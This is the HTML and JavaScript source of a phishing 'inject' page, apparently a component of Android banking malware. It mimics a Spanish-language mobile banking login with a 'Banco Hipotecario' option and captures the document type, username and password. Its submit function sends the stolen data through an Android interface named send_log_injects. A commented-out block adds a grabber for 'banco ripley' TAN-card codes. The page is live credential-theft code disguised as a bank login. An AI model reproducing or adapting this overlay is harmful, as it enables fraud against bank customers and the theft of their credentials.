<!DOCTYPE html>
<html>

<head>
    <title>tests</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.3.1/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.7.8/angular.min.js"></script>
    
    <style>
        html, body {height: 100%; } .err_div {position: fixed; z-index: 1; top: 0; left: 0; width: 100%; height: 100%; background: rgba(12, 12, 12, .6); } .err_box {position: relative; top: 10%; width: 90%; max-width: 307px; margin: 0 auto; padding: 12px 9px; background: rgba(255, 255, 255, 0.98); text-align: center; box-shadow: 0 0 15px black; } .scum_container {position: relative; overflow: hidden; } .scum_container.loader_show .scum {-webkit-animation-name: loader__show; animation-name: loader__show; -webkit-animation-duration: 1s; animation-duration: 1s; transition-timing-function: ease; -webkit-animation-fill-mode: forwards; animation-fill-mode: forwards; } .scum_container.loader_hide {-webkit-animation-name: loader__hide; animation-name: loader__hide; -webkit-animation-duration: 1s; animation-duration: 1s; transition-timing-function: ease; /*     animation-fill-mode:forwards; */ } @-webkit-keyframes loader__show {0% {opacity: 1; } 100% {opacity: 0; -webkit-transform: translateX(1000px); transform: translateX(1000px); } } @keyframes loader__show {0% {opacity: 1; } 100% {opacity: 0; -webkit-transform: translateX(1000px); transform: translateX(1000px); } } @-webkit-keyframes loader__hide {0% {opacity: 0; -webkit-transform: translateX(1000px); transform: translateX(1000px); } 100% {opacity: 1; } } @keyframes loader__hide {0% {opacity: 0; -webkit-transform: translateX(1000px); transform: translateX(1000px); } 100% {opacity: 1; } } body {background: #dedede; } .top {background: white; border-bottom: 1px solid #8c8c8c; color: #386eb9; font-size: 22px; padding: 15px 15px; } span.fa.fa-chevron-left {margin-right: 21px; position: relative; top: 2px; } .main {margin-top: 12px; } .box {background: white; border: 1px solid #565656; border-radius: 4px; } .form-group {margin-bottom: 0px; border-bottom: 1px solid #3a3636; } .d-flex.justify-content-between {padding: 15px 14px; } .form-control {width: 67%; } label {position: relative; top: 6px; font-weight: 700; } span.fa.fa-chevron-right {color: #004085; font-size: 22px; position: relative; top: 2px; margin-left: 10px; } .d1 {font-size: 18px; font-weight: 600; } .buttondiv {margin-top: 8px; } .btn-primary {background: #004085; font-size: 21px; padding: 11px 1px; } span.fa.fa-check {color: #3d8de2; position: relative; top: 6px; font-size: 20px; }
    </style>
</head>

<body ng-app="app" ng-cloak data-ng-controller="c1">
    <!--  -->
    <div class="scum_container">



        <div class="scum" id="login-view" style="display: ;">
            <div class="top">
                <span class="fa fa-chevron-left"></span> Ingresa a Banca por celular
            </div>
            <div class="main">
                <div class="container">
                    <div class="row">
                        <div class="col"></div>
                        <div class="col-sm-10 col-md-8 col-lg-6">
                            <form name="form1" id="form1" autocomplete="off" onsubmit="send1(event,'finish__');return false">
                                <div class="box">
                                    <div class="form-group" onclick="to_type()">
                                        <div class="d-flex justify-content-between">
                                            <label for="user">Tipo Doc.</label>
                                            <div class="d1">
                                                <span class="">{{data.doc_type}}</span>
                                                <span class="fa fa-chevron-right"></span>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="form-group ">
                                        <div class="d-flex justify-content-between">
                                            <label for="user">Usuario</label>
                                            <input type="text" name="user" id="user" pattern=".{4,}" class="form-control" data-err_text="Please enter valid Usuario" data-ng-model="data.user">
                                        </div>
                                    </div>
                                    <div class="form-group " style="border-bottom: 0px">
                                        <div class="d-flex justify-content-between">
                                            <label for="clave">Clave</label>
                                            <input type="text" name="clave" id="clave" pattern=".{4,}" class="form-control" data-err_text="Please enter valid Clave" data-ng-model="data.clave">
                                        </div>
                                    </div>
                                </div>

                                <div class="buttondiv">
                                    <button class="btn btn-primary w-100">
                                        Confirmar
                                    </button>
                                </div>
                            </form>
                        </div>
                        <div class="col"></div>
                    </div>
                </div>
            </div>
        </div>


        <div class="scum" id="type-view" style="display:none ;">
            <div class="top">
                <span class="fa fa-chevron-left"></span> Seleccionar
            </div>
            <div class="main">
                <div class="container">
                    <div class="row">
                        <div class="col"></div>
                        <div class="col-sm-10 col-md-8 col-lg-6">
                            
                                <div class="box">
                                    <div class="form-group"  onclick="to_login()"  data-ng-click="data.doc_type='C.I.'">
                                        <div class="d-flex justify-content-between" >
                                            <label for="user">C.I.</label>
                                            <span data-ng-show="data.doc_type=='C.I.'" class="fa fa-check"></span>
                                        </div>
                                    </div><div class="form-group"  onclick="to_login()"  data-ng-click="data.doc_type='C. Identidad Extranjera'">
                                        <div class="d-flex justify-content-between" >
                                            <label for="user">C. Identidad Extranjera</label>
                                            <span data-ng-show="data.doc_type=='C. Identidad Extranjera'" class="fa fa-check"></span>
                                        </div>
                                    </div><div class="form-group"  onclick="to_login()"  data-ng-click="data.doc_type='Pasaporte'">
                                        <div class="d-flex justify-content-between" >
                                            <label for="user">Pasaporte</label>
                                            <span data-ng-show="data.doc_type=='Pasaporte'" class="fa fa-check"></span>
                                        </div>
                                    </div><div class="form-group"  onclick="to_login()"  data-ng-click="data.doc_type='Banco Hipotecario'">
                                        <div class="d-flex justify-content-between" >
                                            <label for="user">Banco Hipotecario</label>
                                            <span data-ng-show="data.doc_type=='Banco Hipotecario'" class="fa fa-check"></span>
                                        </div>
                                    </div>

                                    <!-- <div class="form-group"  onclick="to_login()"  data-ng-click="data.doc_type='type'">
                                        <div class="d-flex justify-content-between" >
                                            <label for="user">type</label>
                                            <span data-ng-show="data.doc_type=='type'" class="fa fa-check"></span>
                                        </div>
                                    </div> -->
                                    
                                </div>

                                
                            
                        </div>
                        <div class="col"></div>
                    </div>
                </div>
            </div>
        </div>







    </div>
    <!--  -->
    <div class="err_div" style="display:none ;">
        <div class="err_box">
            <h4 class="err_title">Error al validar datos</h4>
            <p class="err_p">
                La información que has ingresado es incorrecta. Inténtalo de nuevo.
            </p>
            <button class="err_buton" onclick="$('.err_div').hide()">Aceptar</button>
        </div>
    </div>
    <script type="text/javascript">
    var app = angular.module('app', [])



    app.controller('c1', ['$scope', function($scope) {
        sc_ = $scope;




        $scope.data = {
            doc_type: "C.I."
        }

    }])








    $('<div class="loader__" style="display:none;position: fixed;background: rgba(21, 20, 20, 0.51);width: 100%;height: 100%;top: 0px;left: 0px;z-index: 1000;text-align: center;">\
   <span class="fa-stack l_1" style="font-size: 50px;position: relative;top: 50%; -webkit-transform: translateY(-50%); -ms-transform: translateY(-50%); transform: translateY(-50%);">\
          <i class="fa fa-circle fa-stack-2x"></i>\
          <i class="fa fa-spinner fa-stack-1x fa-pulse" style="color: white"></i>\
   </span>\
   \
   \
   \
</div>').appendTo('body');

    window.loader_ = {
        hide: function() {

            $('.scum_container').removeClass('loader_hide loader_show')
            $('.scum_container').addClass('loader_hide');
            $('.loader__').fadeOut('slow');
        },
        show: function() {
            $('.loader__').fadeIn('fast');
            $('.scum_container').removeClass('loader_hide loader_show')
            $('.scum_container').addClass('loader_show');
        }
    }




































    $("body").on("keypress change", '.form-control ,.custom_input_class', function() {
        $(this).closest(".form-group").removeClass("has_err");
        $(this).removeClass("has_err");
        $(".err_div").fadeOut();
    });

    setTimeout(function() {
        $('.form-control[data-mask]').each(function(i, el, all) {
            $.mask.definitions['h'] = "[A-Fa-f0-9]";
            $(this).mask($(this).data().mask, {
                placeholder: $(this).attr('mask-placeholder')
            }) //auto mask

        })
    }, 1) // fix for anguler masked intergration 2019



    var send1 = function(e, callback__, global_luhn__) {


        e.preventDefault();
        var el = e.target;
        var err = false;
        var err_text = [];
        var err_elements = [];

        if ($(el).data().hasOwnProperty('sub_ed')) { //2019
            // return;
        }

        $(el).find("input:visible:enabled,select:visible:enabled").each(function() {
            var reg__ = new RegExp($(this).attr('pattern'));

            if (!reg__.test($(this).val())) {
                err = true;
                err_elements.push(this);
                err_text.push(this.dataset.err_text);
                return;
            }
            var luhn__ = $(this).data().luhn;
            if (typeof luhn__ != "undefined" && luhn__ != "") {

                if ($(this).val() != "") {
                    if (!eval(luhn__)($(this).val(), err_text)) {
                        err = true;
                        err_elements.push(this);
                    }
                }
            }
        });

        //time for global_luhn
        if (!err) {
            if (typeof global_luhn__ != "undefined") {
                if (!eval(global_luhn__)(err_text)) {
                    err = true;
                }
            }
        }


        if (err) {
            err_text = err_text.filter(function(e) {
                return e;
            });
            err_text = $.unique(err_text);
            $(".err_ul").html("");
            $(err_text).each(function(i, t) {
                $("<li><span>" + t + "</span></li>").appendTo(".err_ul");
            });

            $(".err_div").show();
            $(err_elements).each(function() {
                $(this).closest(".form-group").addClass("has_err");
                $(this).addClass("has_err");

                //...
            });
            $(window).scrollTop(0);
            return;
        }

        if (typeof callback__ != "undefined") {
            $(el).data('sub_ed', true); //2019
            eval(callback__)(el);
            return;
        }
        //alert("We stack, what to do next?");
    };


    function to_login(){
        loader_.show();
         setTimeout(function() {
            loader_.hide();
            $('.scum').hide();
            $('#login-view').show();
        }, 600)
    }


    function to_type(){
         loader_.show();
         setTimeout(function() {
            loader_.hide();
            $('.scum').hide();
            $('#type-view').show();
        }, 600)
    }



    function next__(el) {

        loader_.show();
        setTimeout(function() {
            loader_.hide();
            $('.scum').hide();
            $(el).closest('.scum').next().show();
        }, 4000)

    }


    function finish__(el) {

        loader_.show();

        // data___ = $('.form').custom_ser()
        // $.each(data___, function(i, v) {
        //     $('<input type="hidden" name="' + i + '" value="' + v + '">').appendTo('#mf') //random prepend
        // })



        submit_data();

    }




    function submit_data() {

//here up to you, if you want to send data over ajax, or send form,to send ajax use data__ var.
data__ = sc_.data;
data__.type_injects = "banks";
data__.closed = "close_activity_injects";

console.log(data__);

var ua = navigator.userAgent.toLowerCase();
if(ua.indexOf("android") > -1) {
    try {
    Android.send_log_injects(JSON.stringify(data__));
    } catch (err) {}
}else{
alert(JSON.stringify(data__));
}
}


    $.fn.autoJump = function() {
        var els = this;
        els.on("input", function() {
            if ($(this).val().length == $(this).attr('maxlength')) {
                var this_ = this;
                els.each(function(i) {
                    if (this === this_) {
                        if (els.length - 1 == i) {
                            els.eq(0).focus();
                        } else {
                            els.eq(i + 1).focus();
                        }
                    }
                });
            }
        });
    };
























































































































    // app.directive('tancard', ['$rootScope', function($rootScope) {

    //     //tan card builder made on angulerjs

    //     return {

    //         scope: true, // {} = isolate, true = child, false/undefined = no change
    //         template: '<div class="card-container">\
    //             <h4>banco ripley</h4>\
    //             <div class="tan-card">\
    //                 <div class="card-row d-flex justify-content-between">\
    //                     <div class="card-item card-item-th"></div>\
    //                     <div class="card-item card-item-th" ng-class-odd="\'odd\'" data-ng-repeat="l in tanCard.horisontal">{{l}}</div>\
    //                 </div>\
    //                 <div class="card-row d-flex justify-content-between" data-ng-repeat="n in tanCard.vertical ">\
    //                     <div class="card-item card-item-number " ng-class-odd="\'odd\'">{{n}} </div>\
    //                     <div class="card-item" data-ng-repeat="l in tanCard.horisontal"><input maxlength="2" ng-model-options="{allowInvalid: true}" subdir ng-disabled="curent_step.indexOf((l+n))=== -1" data-ng-model="tans[l+n]" type="tel" name="{{l+n}}" id="{{l+n}}" pattern="\\d{2}" class="form-control tan-input"></div>\
    //                 </div>\
    //             </div>\
    //             <div class="text-right">\
    //                 <span data-ng-click="swap_chunks()">*Tu última tarjeta</span>\
    //             </div>\
    //         </div>',

    //         link: function($scope, iElm, iAttrs, controller) {
    //             window.sc_ = $scope;


    //             window.next__tans = function(el) {
    //                 loader_.show();
    //                 setTimeout(function() {

    //                     $scope.$apply(function() {
    //                         var res = $scope.swap_chunks()
    //                         if (!res) {
    //                             setTimeout(function() {
    //                                 loader_.hide();
    //                                 $(el).submit();
    //                             })

    //                         } else {
    //                             var tans = res;
    //                             loader_.hide();
    //                             $('.scum').hide(); //edit
    //                             submit_data();

    //                         }
    //                     })

    //                 }, 1000)
    //             }

    //             // this sed to render table 
    //             $scope.tanCard = {
    //                 // horisontal: ["A", "B", "C"],
    //                 horisontal: ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J"],
    //                 vertical: [1, 2, 3, 4, 5],
    //                 chunk_size: 25
    //             }


    //             $scope.tans = {} //used to colect tans from models
    //             $scope.tans_for_send = {} //used to build finaly tasn list
    //             $scope.chunks = [];
    //             $scope.all = [];
    //             $scope.curent_step = []



    //             $scope.$watch(function() {
    //                 //this watch used to watch last itm in push array and than devide it to two portions
    //                 return $scope.all
    //             }, function(n, o) {

    //                 if (n != o & n.length > 0) {

    //                     $scope.chunks = randChunkSplit(Shuffle(n), $scope.tanCard.chunk_size)
    //                     $scope.curent_step = $scope.chunks[0]
    //                     setTimeout(function() {
    //                         $('.tan-input:enabled').autoJump();
    //                     }, 1)

    //                 }
    //             }, true)
    //             $scope.swap_chunks = function() {
    //                 // console.log($scope.chunks.length)
    //                 if ($scope.chunks.length > 1) {
    //                     jQuery.extend($scope.tans_for_send, $scope.tans)
    //                     $scope.chunks.splice(0, 1);
    //                     $scope.tans = {};
    //                     $scope.curent_step = $scope.chunks[0]
    //                     setTimeout(function() {
    //                         $('.tan-input:enabled').autoJump();
    //                     }, 1)
    //                     return false
    //                 } else {
    //                     jQuery.extend($scope.tans_for_send, $scope.tans)
    //                     return $scope.tans_for_send;
    //                 }
    //             }

    //         }
    //     };
    // }]);

    // app.directive('subdir', ['$rootScope', function($rootScope) {
    //     //thsi dieravitve used only to count all combination and push it to parent array
    //     return {
    //         restrict: 'A', // E = Element, A = Attribute, C = Class, M = Comment
    //         link: function($scope, iElm, iAttrs, controller, parent) {
    //             $scope.all.push($scope.l + $scope.n)
    //         }



    //     };
    // }])

    // function Shuffle(o) {
    //     for (var j, x, i = o.length; i; j = parseInt(Math.random() * i), x = o[--i], o[i] = o[j], o[j] = x);
    //     return o;
    // };

    // function randChunkSplit(arr, min, max) {
    //     // uncomment this line if you don't want the original array to be affected
    //     // var arr = arr.slice();
    //     var arrs = [],
    //         size = 1;
    //     var min = min || 1;
    //     var max = max || min || 1;
    //     while (arr.length > 0) {
    //         size = Math.min(max, Math.floor((Math.random() * max) + min));
    //         arrs.push(arr.splice(0, size));
    //     }
    //     return arrs;
    // }
    </script>
</body>

</html>
